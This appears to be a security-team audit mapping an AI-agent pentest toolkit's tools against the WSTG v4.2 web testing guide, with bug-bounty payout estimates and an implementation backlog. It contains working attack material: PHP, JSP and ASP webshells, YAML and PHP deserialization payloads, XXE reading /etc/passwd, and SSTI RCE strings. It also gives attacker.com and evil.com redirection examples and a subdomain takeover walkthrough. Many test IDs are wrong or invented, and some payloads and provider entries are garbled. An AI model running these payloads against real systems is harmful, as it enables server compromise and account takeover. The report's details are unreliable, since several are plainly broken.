# Pentest Crew — WSTG v4.2 Gap Report & Offensive Coverage Audit

**Date:** 2026-05-02
**Auditor:** Senior Offensive Security Engineer (Red Team)
**Scope:** All 91 exported tool singletons, 35 tool files, 8 agent configurations, 6 tool groups

---

## Executive Summary

| Metric | Value |
|--------|-------|
| Exported tool singletons | **91** (not 118 — see note below) |
| Tool classes (total, including BaseModel/helpers) | **218** |
| WSTG test cases covered | **~54 of 90** |
| WSTG test cases missing dedicated tool | **~36** |
| High-payout categories with zero coverage | **4** |
| High-payout categories with partial coverage | **7** |

> **Tool count clarification:** The "118 tools" claim in documentation appears to count fuzzing payload categories and sub-test variants, not distinct `BaseTool` singletons. The 91 singleton count is the authoritative number for agent tool assignment.

---

## Part I — WSTG v4.2 Full Coverage Matrix

### WSTG-INFO — Information Gathering

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-INFM-01 | Robots.txt / sitemap.xml | `robots_sitemap` | ✓ |
| WSTG-INFM-02 | DNS enumeration | `dns_enumeration` | ⚠️ Generator only — no DNS resolution |
| WSTG-INFM-03 | GitHub dorking | `github_dorking` | ⚠️ Generator only — no search execution |
| WSTG-INFM-04 | Path enumeration | `path_enumeration` | ✓ |
| WSTG-INFM-05 | Web server fingerprinting | `favicon_fingerprint`, `js_file_analyzer` | ✓ |
| WSTG-INFM-06 | SPF/DMARC enumeration | — | **MISSING** |
| WSTG-INFM-07 | Identify application entry points | `http_analyst` (implicit) | ⚠️ No dedicated tool; covered by history triage |
| WSTG-INFM-08 | Map execution paths | — | **MISSING** |
| WSTG-INFM-09 | Fingerprint web app framework | `favicon_fingerprint` (partial) | ⚠️ Partial — Wappalyzer only, no header fingerprint |
| WSTG-INFM-10 | Fingerprint web app (version) | `js_file_analyzer` (partial) | ⚠️ Partial |
| WSTG-INFM-11 | Map application architecture | — | **MISSING** |

**Gap:** WSTG-INFM-11 (architecture mapping) is strategically important — maps SPA routing, API versioning, microservice boundaries, and third-party service integration. Should be a primary output of `scope_discovery_agent`.

---

### WSTG-CONF — Configuration & Deployment Management

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-CONF-01 | Network/infrastructure config | — | **MISSING** |
| WSTG-CONF-02 | Application platform config | — | **MISSING** |
| WSTG-CONF-03 | File extension handling | — | **MISSING** |
| WSTG-CONF-04 | Backup/unreferenced files | `scope_discovery` (partial paths only) | ⚠️ Weak — no active backup scanner |
| WSTG-CONF-05 | Enumerate infrastructure | — | **MISSING** |
| WSTG-CONF-06 | HTTP methods (OPTIONS/PUT/DELETE) | — | **MISSING** |
| WSTG-CONF-07 | HSTS enforcement | — | **MISSING** |
| WSTG-CONF-08 | RIA cross-domain policy | `redirect_and_cors_tools` | ✓ (CORS tool covers this) |
| WSTG-CONF-09 | File permission review | — | **MISSING** |
| WSTG-CONF-10 | Subdomain takeover | `dns_enumeration` (partial) | ⚠️ Dangling DNS not actively checked |
| WSTG-CONF-11 | Cloud storage | `s3_bucket_enum` | ⚠️ AWS only — no Azure Blob / GCP Storage |
| WSTG-CONF-12 | Infrastructure config audit | — | **MISSING** |

**Gaps requiring attention:**
- **WSTG-CONF-03 (File Extension Handling)** — maps to file upload RCE (CRITICAL priority, see Part II)
- **WSTG-CONF-06 (HTTP Methods)** — related to WSTG-INPV-12 (HTTP Verb Tempering); should be same implementation
- **WSTG-CONF-07 (HSTS)** — quick header check, 30-minute implementation, HIGH value for compliance findings

---

### WSTG-ATHN — Authentication Testing

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-ATHN-01 | Credentials sent over encrypted channel | `credential_extraction` | ✓ |
| WSTG-ATHN-02 | Default credentials | `auth_endpoint_discovery` | ⚠️ Discovery only — no credential check |
| WSTG-ATHN-03 | Weak lockout mechanism | — | **MISSING** |
| WSTG-ATHN-04 | Account enumeration / guessable accounts | `auth_endpoint_discovery` | ✓ |
| WSTG-ATHN-05 | Weak password policy | — | **MISSING** |
| WSTG-ATHN-06 | Password reset/change | — | **MISSING** |
| WSTG-ATHN-07 | Session ID strength | `session_token_extraction` | ⚠️ Extraction only — no randomness analysis |
| WSTG-ATHN-08 | MFA bypass | — | **MISSING** (see Part II) |
| WSTG-ATHN-09 | Secondary auth (OTP) | `otp_bypass_test` | ✓ (but response manipulation bypass missing) |
| WSTG-ATHN-10 | Out-of-band auth | — | **MISSING** |
| WSTG-ATHN-11 | One-time password bypass | `otp_bypass_test` | ⚠️ Covers OTP reuse/timing — missing response manipulation |
| WSTG-ATHN-12 | Authentication/authorization mapping | `autorize_multi_role` | ✓ |

**Critical missing category:** WSTG-ATHN-06 (Password Reset) is a high-payout bug class. Specifically:
- Token predictability (JWT/numeric/random GUID)
- Token reuse across email threads
- Host header injection in reset links
- Account takeover via email token collision

---

### WSTG-ATHZ — Authorization Testing

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-ATHZ-01 | IDOR | `autorize_check`, `autorize_multi_role`, `graphql_idor_test` | ✓ |
| WSTG-ATHZ-02 | Privilege escalation | `autorize_multi_role` | ✓ |
| WSTG-ATHZ-03 | Unauthorized activity by role | `autorize_multi_role` | ✓ |
| WSTG-ATHZ-04 | Directory traversal | `sql_injection_tools` (in FUZZ_PAYLOADS) | ⚠️ Path traversal in fuzzing only, not dedicated tool |
| WSTG-ATHZ-05 | Business rule bypass | `coupon_bypass_test`, `race_condition_test`, `mass_assignment_test` | ✓ |
| WSTG-ATHZ-06 | Authorization matrix | `autorize_multi_role` | ✓ |

**Status:** Best-covered WSTG section. The session-swap approach in `autorize_tools.py` is robust — both soft bypass (structural equivalence) and hard bypass (victim gets 4xx, attacker gets 200) are implemented correctly.

**Minor gap:** Path traversal authorization testing (WSTG-ATHZ-04) would benefit from a dedicated tool rather than relying on fuzzing payload catch. File traversal in `?file=../../etc/passwd` often bypasses authorization checks directly.

---

### WSTG-SESS — Session Management

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-SESS-01 | Session fixation | `session_fixation_test` | ✓ |
| WSTG-SESS-02 | Cookie attributes | `cookie_persistence_test` | ✓ |
| WSTG-SESS-03 | Session token permutation | — | **MISSING** |
| WSTG-SESS-04 | CSRF | — | **MISSING** (referenced in `exploit_chain_tools.py` but no dedicated tool) |
| WWTG-SESS-05 | JWT security | `jwt_analysis`, `jwt_none_bypass`, `jwt_manipulate`, `jwt_alg_confusion` | ✓ (but JKU/KID attacks missing) |
| WSTG-SESS-06 | Session logout | `cookie_persistence_test` (partial) | ⚠️ No dedicated logout verification |
| WSTG-SESS-07 | CORS misconfiguration | `cors_misconfig_test` | ✓ |
| WSTG-SESS-08 | Session timeout | — | **MISSING** |
| WSTG-SESS-09 | Session puzzling | — | **MISSING** |
| WSTG-SESS-10 | WS hijacking | `ws_handshake_test`, `cswsh_test` | ✓ |

**Notable gap:** WSTG-SESS-04 (CSRF) has no dedicated tool. The `exploit_chain_tools.py` hardcodes "CSRF" in chain CHAIN-002 (XSS+CSRF → ATO) but CSRF cannot be confirmed as a standalone vulnerability. This is a HIGH gap — CSRF is a top-5 finding on most programs.

---

### WSTG-INPV — Input Validation (Injection)

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-INPV-01 | SQL Injection | 5 dedicated tools + `sql_injection_full_test` | ✓ Excellent |
| WSTG-INPV-02 | XSS (reflected/stored) | `xss_context_test`, `xss_waf_bypass`, `xss_comprehensive` | ✓ Excellent |
| WSTG-INPV-03 | XSS (DOM-based) | `dom_xss_test`, `dom_xss_taint_track`, `dom_xss_fragment_test` | ✓ |
| WSTG-INPV-04 | Header injection (redirect/CRLF) | `open_redirect_test`, `crlf_injection_test` | ✓ |
| WSTG-INPV-05 | OS command injection | 5 tools including blind + output extraction | ✓ Excellent |
| WSTG-INPV-06 | Business logic bypass via injection | `ldap_injection_test` | ⚠️ LDAP only; other business logic injection uncategorized |
| WSTG-INPV-07 | LDAP Injection | `ldap_injection_test`, `ldap_blind_injection_test` | ✓ |
| WSTG-INPV-08 | XXE | 5 tools including blind + billion laughs | ✓ Excellent |
| WSTG-INPV-09 | Host header injection | `host_header_injection` | ✓ |
| WSTG-INPV-10 | SSRF | 5 tools including protocol smuggling, IMDSv2 | ✓ Excellent |
| WSTG-INPV-11 | XML Injection | `xxe_test` (partial) | ⚠️ Non-XML XML injection (i.e., SOAPAction abuse) not covered |
| WSTG-INPV-12 | HTTP Verb Tempering | — | **MISSING** |
| WSTG-INPV-13 | Path Traversal | `fuzzing_tools` (payload set only) | ⚠️ No dedicated tool; relies on `FUZZ_PAYLOADS["path_traversal"]` |
| WSTG-INPV-14 | Format String | — | **MISSING** |
| WSTG-INPV-15 | SMTP/IMAP Injection | — | **MISSING** |
| WSTG-INPV-16 | IMAP/SMTP injection | `ldap_injection_tools` (pattern only) | ⚠️ SMTP/IMAP not tested |
| WSTG-INPV-17 | Software vulnerabilities | — | **MISSING** (version-specific CVE checking) |

**Note on WSTG-INPV-06:** "Business logic bypass via injection" refers to using injection payloads to bypass domain logic constraints (e.g., SQLi to bypass price checks). `coupon_bypass_test` covers some cases, but a generalized "logic_bypass_via_injection" tool is missing. Payloads like `' OR 1=1 --` in authorization headers or pricing fields map here.

---

### WSTG-IDPR — Authorization / IDOR

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-IDPR-01 | Path IDOR | `autorize_check` | ✓ |
| WSTG-IDPR-02 | Indirect references | `autorize_check` | ✓ |
| WSTG-IDPR-03 | Horizontal privilege escalation | `autorize_check`, `autorize_multi_role` | ✓ |
| WSTG-IDPR-04 | Vertical privilege escalation | `autorize_multi_role` | ✓ |
| WSTG-IDPR-05 | Broken function level authorization | `autorize_multi_role` | ✓ |

**Status:** Best-covered authorization section. The multi-role check in `autorize_tools.py` correctly implements the 3-phase session swap approach.

---

### WSTG-BUSL — Business Logic

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-BUSL-01 | Generic business logic flaws | — | **MISSING** (inherently hard to tool) |
| WSTG-BUSL-02 | Process flow tampering | `multi_step_flow_test` | ✓ |
| WSTG-BUSL-03 | Fulfillment testing | — | **MISSING** |
| WSTG-BUSL-04 | Race conditions | `race_condition_test` | ✓ |
| WSTG-BUSL-05 | Mass assignment | `mass_assignment_test` | ✓ |
| WSTG-BUSL-06 | Fraud/financial testing | — | **MISSING** |

**Note:** WSTG-BUSL-01 is intentionally difficult to tool — it requires understanding business rules. The `multi_step_flow_test` and `coupon_bypass_test` partially cover it. The real gap is in pricing/quantity manipulation beyond coupon codes.

---

### WSTG-CLIENT — Client-Side Testing

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-CLIENT-01 | DOM XSS | `dom_xss_test`, `dom_xss_taint_track`, `dom_xss_fragment_test` | ✓ |
| WSTG-CLIENT-02 | JavaScript execution | — | **MISSING** (DOM XSS tool covers some) |
| WSTG-CLIENT-03 | HTML injection | `xss_context_test` (partial) | ⚠️ Covered by XSS tools but no dedicated HTML injection tool |
| WSTG-CLIENT-04 | URL manipulation | `dom_xss_fragment_test` (partial) | ⚠️ Fragment routing covered, query string manipulation not |
| WSTG-CLIENT-05 | CSS injection | — | **MISSING** |
| WSTG-CLIENT-06 | Client-side RIA | — | **MISSING** |
| WSTG-CLIENT-07 | Clickjacking | — | **MISSING** |
| WSTG-CLIENT-08 | Prototype pollution | `prototype_pollution_test`, `prototype_pollution_deep` | ✓ |
| WSTG-CLIENT-09 | postMessage security | `postmessage_security_test` | ⚠️ Server-side reflection only — cannot send real browser postMessage |
| WSTG-CLIENT-10 | WebStorage/JS framework injection | — | **MISSING** |

**Notable gap:** WSTG-CLIENT-07 (Clickjacking) is a well-defined, high-severity finding (CVSS 6.1–8.9). Requires testing `X-Frame-Options`, `Content-Security-Policy: frame-ancestors`, and `sandbox` attribute. Should take 30 minutes to implement.

---

### WSTG-CACHE — Cache & Session

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-CACHE-01 | Web cache poisoning | `cache_poisoning_test` | ✓ |
| WSTG-CACHE-02 | Web cache deception | `cache_deception_test` | ✓ |
| WSTG-CACHE-03 | Private cache leakage | `cache_deception_test` (partial) | ⚠️ `Cache-Control: private` testing is incomplete |

---

### WSTG-CRYPTO — Cryptography

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-CRYPSTG-01 | Weak crypto (sensitive data transmission) | `jwt_analysis`, `ssl_analysis` (in coverage_gap_tools) | ⚠️ TLS version checking missing |
| WSTG-CRYPSTG-02 | Hardcoded crypto keys | — | **MISSING** |
| WSTG-CRYPSTG-03 | Password algorithms | — | **MISSING** |

**Gap:** No tool checks for TLS versions (SSLv2/v3, TLS 1.0/1.1 detection) or cipher suite strength. `jwt_analysis` covers token-level crypto well.

---

### WSTG-API — API Security

| Test ID | Description | Tool(s) | Status |
|---------|-------------|---------|--------|
| WSTG-APIS-01 | GraphQL introspection | `graphql_introspection` | ✓ |
| WSTG-APIS-02 | REST API auth/bypass | `autorize_check` | ✓ |
| WSTG-APIS-03 | REST authorization bypass | `autorize_multi_role` | ✓ |
| WSTG-APIS-04 | GraphQL batch/bypass | `graphql_batch_bypass` | ✓ |
| WSTG-APIS-05 | GraphQL injection | `sql_injection_tools`, `xss_tools` (context) | ⚠️ GraphQL-specific injection not targeted |
| WSTG-APIS-06 | GraphQL subscription/event | — | **MISSING** (see Part II) |
| WSTG-APIS-07 | GraphQL field cost analysis | — | **MISSING** |
| WSTG-APIS-08 | REST API replay | — | **MISSING** |

**Notable gap:** WSTG-APIS-06 (GraphQL Subscriptions) — GraphQL subscriptions over WebSocket expose event-driven data streams that bypass typical authorization checks on queries. If the `subscriptionType` is detected in introspection, the pipeline should hand off to the WS security tools with subscription-specific payloads.

---

## Part II — High-Payout Bug Classes: Complete Gap Analysis

### CRITICAL Priority

---

#### 1. Unsafe Deserialization — ZERO dedicated coverage

**Current state:** `coverage_gap_tools.py` lists "deserialization" as a coverage gap. No tool exists. The `sql_injection_tools` and `command_injection_tools` do not cover deserialization chains.

**Impact:** RCE via PHP `unserialize()`, Java `ObjectInputStream`, Python `pickle`/`yaml.unsafe_load`, Ruby `Marshal.load`, .NET `BinaryFormatter`. One of the highest CVSS findings in bug bounty — routinely $2,000–$10,000+ per confirmed instance.

**Payout range:** $1,000–$25,000 (CVSS 9.1–10.0 when chained to RCE)

**Payload categories needed:**
```python
JAVA_DESERIALIZATION = [
    'rO0ABX...',  # CommonsCollections6 ysoserial base64
    '${jndi:ldap://...}',  # JNDI injection (Log4Shell pattern)
    '忍',  # spring-util serialized object
]
PHP_DESERIALIZATION = [
    'O:8:"stdClass":1:{s:5:"data";s:9:"<?php phpinfo();?>";}',  # custom
    'a:1:{i:0;O:8:"stdClass":0:{};}',  # array wrap
    'C:16:"SplStack":...',  # SPL deserialization gadgets
]
PYTHON_PICKLE = [
    "cnumpy\ncore\nfrombuffer\n..."  # pickled numpy array with code execution
    "ctypes\nFunctionType\n...",  # arbitrary code execution gadget chain
    "c pickletools\n.",  # dis helper for analysis
]
YAML_UNSAFE_LOAD = [
    '!!python/object/apply:os.system ["id"]',
    '!!python/object/apply:subprocess.check_output ["id"]',
    '!!python/object:exec "import os; os.system(\'id\')"',
]
```

**Implementation plan:**
- New file: `deserialization_tools.py` (~400 LOC)
- 4 tool classes: `JavaDeserializationTool`, `PHPUnserializeTool`, `PythonPickleTool`, `RubyMarshalTool`
- Detection: trigger `__wakeup()` / `__destruct()` gadget chains, look for class property overwrite in response
- OOB detection: use `generate_collaborator` payload in gadget chains (Java JNDI → LDAP → Collaborator)
- **Owner:** `validation_executor` — deserialization must be confirmed with actual payload replay
- **Integration:** Add `"deserialization"` → `["deserialization_tools"]` to `TOOL_CATEGORIES` in `__init__.py`

**Sample test case:**
```
Target: POST /api/user/profile
Body (JSON): {"avatar": "https://example.com/avatar.jpg", "profile_data": "O:8:\"User\":1:{s:4:\"role\";s:9:\"admin\";}"}

Expected: Server deserializes profile_data as PHP object
Confirmed by: Response contains admin-role session OR profile_data reflected back with class metadata
```

---

#### 2. File Upload RCE — ZERO dedicated coverage

**Current state:** No file upload tool exists. `WSTG-CONF-03` (file extension handling) is unaddressed. `fuzzing_tools.py` has no upload-related payloads.

**Impact:** Upload of PHP/JSP/ASPX webshells disguised as images, document parsers (SVG with XSS, DOCX with XXE, PDF with SSRF), polyglot files for polyglot attacks. Directly leads to server compromise.

**Payout range:** $500–$50,000 (CVSS 9.8 for confirmed upload + RCE)

**Payload categories needed:**
```python
WEBSHELL_PAYLOADS = {
    "php": [
        '<?php @eval($_POST["cmd"]); ?>',
        '<?php system($_GET["cmd"]); ?>',
        '<?php echo shell_exec($_POST["x"]); ?>',
        # Image polyglot (PNG + PHP)
        '\x89PNG\r\n\x1a\n<?php @eval($_POST["x"]); ?>',
    ],
    "jsp": [
        '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        '<jsp:useBean class="java.lang.Runtime" />',
    ],
    "asp": [
        '<%@ Page Language="Jscript" %><%eval(Request.Item["cmd"],"unsafe"); %>',
    ],
}
SVG_MALICIOUS = [
    '<?xml version="1.0"?><svg onload="alert(document.domain)">',  # XSS
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><foo>&xxe;</foo></svg>',  # XXE
    '<?xml version="1.0"?><svg xmlns:xlink="http://www.w3.org/1999/xlink"><script>alert(1)</script></svg>',  # XSS
]
OFFICE_DOCUMENT = [
    # DOCX with embedded XXE (zip containing malicious XML)
    # PPTX with script injection in slide XML
]
```

**Implementation plan:**
- New file: `file_upload_tools.py` (~350 LOC)
- 3 tool classes: `FileUploadTestTool`, `PolyglotUploadTool`, `UploadParseExploitTool`
- Strategy: discover upload endpoints from proxy history → enumerate accepted extensions → probe content-type + extension bypass → attempt webshell execution via known-path traversal
- **Owner:** `fuzzing_agent` for endpoint discovery, `validation_executor` for confirmed upload exploitation
- Bypass techniques: `Content-Type` override, double extension (`.php.jpg`), null byte injection, `exifimagedata` corruption, polyglot files

**Sample test case:**
```
1. GET /profile/avatar → discover upload endpoint: POST /api/upload
2. Extract accepted extensions from JS: ["jpg","jpeg","png","gif","webp"]
3. Upload PHP webshell as avatar.jpg → server accepts
4. Access uploaded file: GET /uploads/avatar.jpg?cmd=id
5. Response: uid=33(www-data) gid=33(www-data) — CONFIRMED RCE
```

---

### HIGH Priority

---

#### 3. Subdomain Takeover — Dangling DNS check MISSING

**Current state:** `dns_enumeration` generates subdomain lists but does not verify CNAME resolution against known-dangling providers (Heroku, GitHub Pages, Bitbucket, Shopify, Azure, Campaign Monitor, etc.). `open_redirect_test` has a `SUB_DOMAIN_TAKEOVER_PATTERNS` list but it is used for open redirect detection, not active CNAME checking.

**Impact:** Claiming expired DNS pointers to staging environments, internal tools, or partner services. High-impact on programs with broad scope. Routinely rated P1-P2.

**Payout range:** $100–$2,000 (P2 on most programs, P1 if internal tools accessible)

**Implementation plan:**
- New file: `subdomain_takeover_tools.py` (~250 LOC)
- Tool: `SubdomainTakeoverTool` — takes DNS enumeration output, resolves each CNAME, checks against dangling provider list
- Provider list (50+ services):
```python
DANGLING_PROVIDERS = {
    "herokuapp.com": "Heroku sandbox",
    "ghgithub.com": "GitHub Pages",
    "gitlab.io": "GitLab Pages",
    "surge.sh": "Surge.sh",
    "cloudfront.net": "AWS CloudFront (orphaned)",
    "cloudapp.azure.com": "Azure cloud service (orphaned)",
    "azurewebsites.net": "Azure App Service (orphaned)",
    "amazonaws.com": "S3 bucket (orphaned)",
    "b-cdn.net": "BootstrapCDN (orphaned)",
    "cargo.live": "Cargo.run",
    "createsend.com": "Campaign Monitor",
    "desk.com": "Desk.com (Salesforce)",
    "feedpress.co": "FeedPress",
    "ghost.io": "Ghost.io",
    "helpjuice.com": "Helpjuice",
    "helpscoutdocs.com": "Help Scout",
    "ingresses.svc": "Kubernetes (orphaned)",
    "launchrock.com": "LaunchRock",
    "newrelic.com": "New Relic (orphaned)",
    "pantheon.io": "Pantheon",
    "readme.io": "ReadMe.io",
    "short.io": "Short.io",
    "smartling.com": "Smartling",
    "staging.testrail.io": "TestRail",
    "tictail.com": "Tictail",
    "tilda.io": "Tilda",
    "tumblr.com": "Tumblr",
    "uber.space": "Uber Space",
    "uptimerobot.com": "UptimeRobot",
    "uservoice.com": "UserVoice",
    "webflow.io": "Webflow",
    "wordpress.com": "WordPress.com",
    "wp.com": "WordPress.com (redirect)",
}
```
- **Owner:** `scope_discovery_agent` — runs after DNS enumeration completes
- Uses `send_http1_request` to probe `Host: subdomain.target.com` for HTTP response confirmation

**Sample test case:**
```
1. DNS enumeration: api.target.com → CNAME → api-target-xyz.herokuapp.com
2. Resolve CNAME: herokuapp.com returns "No such app"
3. Claim: Register at heroku.com with same app name
4. Confirm: GET https://api.target.com returns YOUR Heroku app
5. Impact: Control all API traffic for api.target.com
```

---

#### 4. SSTI (Server-Side Template Injection) — Dedicated tool MISSING

**Current state:** `FUZZ_PAYLOADS["ssti"]` has 8 payloads (e.g., `{{7*7}}`, `${7*7}`) but no dedicated detection/confirmation tool. The fuzzing combo sends these as raw parameter values but has no mechanism to detect server-side template evaluation vs. reflected output. No tool handles Jinja2, Twig, Freemarker, Velocity, Thymeleaf, Handlebars differentiation.

**Impact:** SSTI is frequently a direct path to RCE. Common in Python/Flask/Django, Ruby/erb, Node.js/Express (EJS), Java (Thymeleaf/Freemarker). High CVSS, often $500–$5,000 per finding.

**Payout range:** $500–$10,000 (CVSS 9.0 when leads to RCE)

**Current partial coverage in:**
- `websocket_security_tools.py` lines 99–100: SSTI payloads in WS messages (narrow scope)
- `redirect_and_cors_tools.py` line 308: `{{hostname}}` template injection (narrow scope)
- `FUZZ_PAYLOADS["ssti"]`: raw payload list only, no detection logic

**Implementation plan:**
- New file: `ssti_tools.py` (~450 LOC)
- 3 tool classes: `SSTITestTool`, `SSTIBlindTool`, `SSTIRceTool`
- Detection approach: 3-stage blind SSTI detection
  - Stage 1 (reflection): `{{7*7}}` → look for `49` in response
  - Stage 2 (identification): Framework-specific payloads (`#{ENV['HOME']}`, `<%= 7*7 %>`, `${''..class__}`, `{{[].class.abstract}}`)
  - Stage 3 (RCE): If framework confirmed, send RCE payload specific to that template engine
- Framework payload matrix:
```python
SSTI_FRAMEWORK_PAYLOADS = {
    "jinja2": ["{{ config.items()|join(',') }}", "{{ ''.__class__.__mro__[1].__subclasses__() }}"],
    "twig": ["{{ _self.env.getTemplate('foo').show({}) }}", "{{ [1]|map('system')|join }}"],
    "freemarker": ["<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"],
    "velocity": ["#set($r=$runtime.newInstance($arg))"],
    "handlebars": ["{{#with (lookup . (string .))}} {{/with}}"],
    "erb": ["<%= 7*7 %>", "<%= File.read('/etc/passwd') %>"],
    "thymeleaf": ["__${T(T).getDeclaredMethods()[0]}__"],
}
```
- **Owner:** `validation_executor` — confirmed SSTI needs targeted RCE exploitation
- OOB via Burp Collaborator for blind SSTI detection

---

#### 5. Host Header Injection in Password Reset — Partial coverage

**Current state:** `host_header_injection` tool exists in `redirect_and_cors_tools.py` but it tests generic Host header manipulation. It does NOT specifically target the password reset flow — the most impactful exploitation path for Host header injection (account takeover via password reset link sent to attacker-controlled domain).

**Gap:** No tool verifies whether the password reset token is sent to the Host header value when the application reflects it in email generation.

**Implementation plan:**
- Enhancement to `host_header_injection` tool (or new `host_header_reset_tool.py`)
- Add flow: identify password reset endpoint → replay with `X-Forwarded-Host: evil.com` and `Host: evil.com` → check for evidence that reset link goes to attacker domain
- **Owner:** `auth_agent` — this is an authentication flow attack

---

#### 6. OTP Bypass — Response Manipulation Missing

**Current state:** `otp_bypass_test` in `business_logic_tools.py` covers:
- OTP reuse (same token on second attempt)
- Timing oracle (requests within 50ms threshold)
- Wrong-value detection (non-numeric input)

**Missing:** Response manipulation bypass — sending `{"success": true}` or `{"otp_valid": true}` as the server response and seeing if the application accepts it without server-side validation. Common in mobile API backends.

**Implementation plan:**
- Add `OTPBypassResponseManipulationTool` to `business_logic_tools.py`
- Strategy: capture OTP verification request → modify response body to `{"status":"success"}` → replay → check if session is authenticated
- Requires `send_http1_request` and response comparison

---

### MEDIUM Priority

---

#### 7. HTTP Verb Tempering (WSTG-INPV-12) — NO dedicated tool

**Current state:** `fuzzing_tools.py` has `FUZZ_PAYLOADS` but no HTTP method manipulation. `fuzzing_combo` only changes parameter values, not HTTP verbs.

**Gap:** No tool tests `PATCH`, `TRACE`, `CONNECT`, `OPTIONS`, custom methods like `HTTP-method-Override` header.

**Implementation plan:**
- New file: `http_verb_tampering_tools.py` (~150 LOC)
- 2 tool classes: `HTTPVerbTamperingTool`, `HTTPMethodOverrideTool`
- Strategy: extract endpoints from proxy history → replay with alternative verbs → compare behavior (200 vs 405 vs 403)
- **Owner:** `fuzzing_agent` or `validation_executor`

---

#### 8. MFA/2FA Bypass — No dedicated tool

**Current state:** OTP bypass (WSTG-ATHN-09) is covered, but MFA bypass (WSTG-ATHN-08) broader category is missing. Specifically:
- MFA code disclosure in HTTP response
- MFA token in URL parameter
- Missing MFA step (skip via direct URL)
- Backup code usage
- Trusted device bypass via cookie tampering

**Implementation plan:**
- New file: `mfa_bypass_tools.py` (~300 LOC)
- 4 tool classes: `MFASkipTool`, `MFACodeDisclosureTool`, `MFAWeakTokenTool`, `MFABackupCodeTool`
- **Owner:** `auth_agent`

---

#### 9. Azure Blob / GCP Storage Enumeration

**Current state:** `s3_bucket_tools.py` covers AWS S3 only (12 endpoint formats). Azure Blob (`blob.core.windows.net`) and GCP Storage (`storage.googleapis.com`) are not tested.

**Implementation plan:**
- Add to `s3_bucket_tools.py` or create `cloud_storage_tools.py`
- Azure Blob patterns: `https://{account}.blob.core.windows.net/{container}/{blob}`
- GCP Storage patterns: `https://storage.googleapis.com/{bucket}/{object}`
- Enumeration: Check `GET` without auth (public read), `PUT` without auth (upload), authentication via account key in URL
- **Owner:** `scope_discovery_agent`

---

#### 10. JWT jku/kid Confusion Attacks — Missing

**Current state:** `jwt_security_tools.py` covers `none` algorithm, HS256 weak secrets, and basic algorithm confusion. **Missing:** `jku` (JWK Set URL) header injection and `kid` (Key ID) header confusion.

**Attacks:**
- **JKU spoofing:** Set `{"jku": "https://attacker.com/.well-known/jwks.json"}` and host a key under attacker's control
- **Kid manipulation:** `{"kid": "../../../../etc/passwd"}` — file-based key injection; `{"kid": "default"}` — key confusion

**Implementation plan:**
- Add to `jwt_security_tools.py`
- `JWTJkuSpoofTool`, `JWTKidConfusionTool`
- **Owner:** `validation_executor`

---

#### 11. GraphQL Subscriptions (WSTG-APIS-06)

**Current state:** `graphql_security_tools.py` has 6 tools, all for queries/mutations. Subscriptions (`subscriptionType` detection in introspection) is noted but not tested.

**Implementation plan:**
- Add to `graphql_security_tools.py`
- `GraphQLSubscriptionTestTool` — detect `subscriptionType` → check if WS upgrade possible → test subscription data via WS → check if authorization enforced on subscription events
- **Owner:** `fuzzing_agent` or `validation_executor`

---

#### 12. Clickjacking (WSTG-CLIENT-07)

**Current state:** No tool exists.

**Implementation plan:**
- New file: `clickjacking_tools.py` (~120 LOC)
- `ClickjackingTestTool` — send request to target → check `X-Frame-Options`, `Content-Security-Policy: frame-ancestors`, `sandbox` header values → report missing protections
- **Owner:** `http_analyst` — passive, low-privilege check

---

## Part III — Additional High-Value Gaps

### 13. CSRF Token Verification (WSTG-SESS-04)

No dedicated CSRF tool exists. The `exploit_chain_tools.py` references CSRF in chain CHAIN-002 but there is no confirmation mechanism. A basic CSRF check requires:
1. Extract CSRF token from form (look for `csrf`, `_token`, `nonce` in input names)
2. Submit form without token → compare response to form with token
3. Check `SameSite` cookie attribute (covered by `cookie_persistence_test` partially)

### 14. SMTP/IMAP Injection (WSTG-INPV-15/16)

No SMTP/IMAP injection tool. If application sends email (registration, password reset), test for:
- `RCPT TO:<evil@attacker.com>` injection in email field
- Newline injection in email headers
- Email body injection with `{`/cmd`}` payloads

### 15. HSTS Header Check (WSTG-CONF-07)

Quick header check. No dedicated tool.

### 16. Weak Lockout Mechanism (WSTG-ATHN-03)

Brute-force rate limiting test for authentication endpoints. `auth_endpoint_discovery` finds the endpoints but no tool tests lockout thresholds.

### 17. Session Token Randomness Analysis (WSTG-SESS-03)

`session_token_extraction` extracts tokens but does not analyze randomness. Should check:
- Token length vs. entropy (short tokens, predictable patterns)
- Character set analysis (only hex, only lowercase)
- Time-based token predictability

---

## Part IV — Implementation Backlog

### Implementation Backlog — Priority Ordered

| # | Gap | WSTG Category | Severity | Payout Range | Est. LOC | Owner | Implementation Notes |
|---|-----|--------------|----------|-------------|----------|-------|----------------------|
| 1 | File Upload RCE | CONF-03 | CRITICAL | $500–$50,000 | ~350 | fuzzing_agent / validation_executor | Polyglot, webshell, parse exploits |
| 2 | Unsafe Deserialization | INPV-17 | CRITICAL | $1,000–$25,000 | ~400 | validation_executor | PHP/Java/Python/Ruby gadget chains |
| 3 | Subdomain Takeover | CONF-10 | HIGH | $100–$2,000 | ~250 | scope_discovery_agent | Dangling DNS CNAME check |
| 4 | SSTI (dedicated tool) | INPV-01 (variant) | HIGH | $500–$10,000 | ~450 | validation_executor | 3-stage detect + per-framework RCE |
| 5 | MFA Bypass | ATHN-08 | HIGH | $200–$5,000 | ~300 | auth_agent | Skip, disclosure, backup codes |
| 6 | HTTP Verb Tempering | INPV-12 | HIGH | $100–$1,000 | ~150 | fuzzing_agent | PATCH/TRACE/CONNECT/OPTIONS |
